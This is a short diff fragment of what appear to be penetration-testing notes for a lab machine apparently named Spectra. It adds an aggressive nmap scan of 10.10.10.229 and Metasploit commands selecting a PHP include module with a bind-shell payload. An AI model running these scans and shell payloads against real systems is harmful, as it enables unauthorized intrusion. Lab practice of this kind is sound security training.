@@ -37,3 +37,10 @@ set options
 set payload
 run
 
+nmap -A -T4 -p- -Pn 10.10.10.229
+
+SPECTRA
+
+use unix/webapp/php_include
+
+set payload payload/php/bind_php_ipv6
